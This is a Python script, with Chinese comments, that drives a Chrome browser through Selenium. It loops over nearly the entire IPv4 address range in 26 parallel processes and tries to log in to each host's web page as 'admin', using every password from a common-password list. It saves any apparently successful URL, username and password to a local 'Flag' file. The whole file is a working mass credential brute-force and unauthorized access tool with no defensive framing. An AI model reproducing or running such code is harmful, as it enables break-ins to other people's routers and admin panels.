#-*-  coding:utf-8 -*-
#主要用来测试selenium使用phantomJs
from multiprocessing import Process
#导入webdriver
from selenium import webdriver
import time




def Simulated_Login(url,password):
    #调用环境变量指定的Chrome浏览器创建浏览器对象
    driver = webdriver.Chrome(executable_path = "C:\\Users\\chromedriver.exe")
    driver.set_window_size(1366, 768)


    #如果没有在环境变量指定PhantomJS位置
    #driver = webdriver.Chrome(executable_path = "./chromedriver.exe")
    #driver.get("http://www.baidu.com/")
    driver.get(url)
    #html_text=driver.page_source
    #print(html_text)
    try:
        username="admin"
        #password="xxxxxx"
        # click()是模拟点击
        driver.find_element_by_id("username").clear()

        driver.find_element_by_id("username").clear()
        driver.find_element_by_id("username").send_keys(username)
        driver.find_element_by_id("password").clear()
        driver.find_element_by_id("password").send_keys(password)
        driver.find_element_by_class_name("login-btn").click()
        try:
            time.sleep(60)
            #res=driver.find_element_by_class_name("inputValidTip").click()
            driver.find_element_by_class_name("exit").click()
            #print("成功")
            driver.quit()
            f = open("E:\\Flag.txt", "a+",encoding='utf8')
            f.write(url + "\n")
            f.write("账号:"+username + "\n")
            f.write("密码:"+password + "\n")
            f.close()

            return 0
        except BaseException:
            f = open("E:\\error.txt", "a+",encoding='utf8')
            f.write(url + "\n")
            f.close()
            driver.quit()
    except BaseException:
        driver.quit()
        pass



def IPS(k,j):

    i = 256
    for a in range (k, j):
        for b in range(i):
            for c in range(i):
                for d in range(i):
                        url = "http://"+str(a) + '.' + str(b) + '.' + str(c) + '.' + str(d)

                        file = open("E:\\pwdTop54.txt", "r", encoding='utf8')
                        for line in file.readlines():
                            password = line.strip()
                            Simulated_Login(url, password)
                            if a==0:
                                break
                            #print(password)

                    # print(url)
                    # f = open("E:\\"+str(k)+"-"+str(j)+".txt", "a+")
                    # f.write(url + "\n")
                    # f.close()

if __name__ == '__main__':
    p1=Process(target=IPS,args=(1,10,))
    p2=Process(target=IPS,args=(11,20,))
    p3=Process(target=IPS,args=(21,30,))
    p4=Process(target=IPS,args=(31,40,))
    p5=Process(target=IPS,args=(41,50,))
    p6=Process(target=IPS,args=(51,60,))
    p7=Process(target=IPS,args=(61,70,))
    p8=Process(target=IPS,args=(71,80,))
    p9=Process(target=IPS,args=(81,90,))
    p10=Process(target=IPS,args=(91,100,))
    p11=Process(target=IPS,args=(101,110,))
    p12=Process(target=IPS,args=(111,120,))
    p13=Process(target=IPS,args=(121,130,))
    p14=Process(target=IPS,args=(131,140,))
    p15=Process(target=IPS,args=(141,150,))
    p16=Process(target=IPS,args=(151,160,))
    p17=Process(target=IPS,args=(161,170,))
    p18=Process(target=IPS,args=(171,180,))
    p19=Process(target=IPS,args=(181,190,))
    p20=Process(target=IPS,args=(191,200,))
    p21=Process(target=IPS,args=(201,210,))
    p22=Process(target=IPS,args=(211,220,))
    p23=Process(target=IPS,args=(221,230,))
    p24=Process(target=IPS,args=(231,240,))
    p25=Process(target=IPS,args=(241,250,))
    p26=Process(target=IPS,args=(251,256,))
    p1.start()
    p2.start()
    p3.start()
    p4.start()
    p5.start()
    p6.start()
    p7.start()
    p8.start()
    p9.start()
    p10.start()
    p11.start()
    p12.start()
    p13.start()
    p14.start()
    p15.start()
    p16.start()
    p17.start()
    p18.start()
    p19.start()
    p20.start()
    p21.start()
    p22.start()
    p23.start()
    p24.start()
    p25.start()
    p26.start()
